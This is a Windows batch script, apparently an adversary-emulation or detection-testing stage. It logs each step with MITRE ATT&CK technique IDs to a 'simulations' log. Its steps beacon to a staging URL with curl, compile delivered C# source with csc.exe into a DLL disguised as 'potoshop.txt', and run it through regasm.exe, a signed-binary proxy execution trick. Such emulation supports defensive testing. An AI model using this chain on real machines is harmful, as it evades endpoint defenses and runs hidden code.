@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
SET recnn=%APPDATA%\10180\59bd7a18
SET detcfkn=https://10.0.0.49
SET uouoq=https://10.0.0.49/stage/2/icon.png?10180-10
SET lqyereup=ITZEL-S2BS
SET ufeybybm=10
SET hpnjatpj=potoshop.txt
SET njozco=file.txt
SET kkjwr=10180
SET lttqtnl=%APPDATA%\!ufeybybm!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_start=>> "!lttqtnl!" 2>nul
curl -k -s -o nul "!uouoq!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: heartbeat_end=>> "!lttqtnl!" 2>nul

echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir_start=>> "!lttqtnl!" 2>nul
cd /d "!recnn!"
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: chdir_end=>> "!lttqtnl!" 2>nul

SET dhtxwu=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\csc.exe
SET jqekfe=0
SET ggqchj=
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_start=>> "!lttqtnl!" 2>nul
!dhtxwu! /target:library /out:"!hpnjatpj!" "!njozco!" >nul 2>&1 && SET jqekfe=1 || SET ggqchj=compile_failed
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: compile_end=!jqekfe!>> "!lttqtnl!" 2>nul
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1500|Compile After Delivery=!jqekfe!:!ggqchj!>> "!lttqtnl!" 2>nul

SET shbtyx=%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe
SET ttyrpx=0
SET reatfh=
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: regasm_start=>> "!lttqtnl!" 2>nul
!shbtyx! /U "!hpnjatpj!" >nul 2>&1 && SET ttyrpx=1 || SET reatfh=assembly_load_failed
echo [!DATE! !TIME!][DEBUG][!lqyereup!][!kkjwr!]: regasm_end=!ttyrpx!>> "!lttqtnl!" 2>nul
echo [!DATE! !TIME!][TTP][!lqyereup!][!kkjwr!]: T1218|Signed Binary Proxy Execution=!ttyrpx!:!reatfh!>> "!lttqtnl!" 2>nul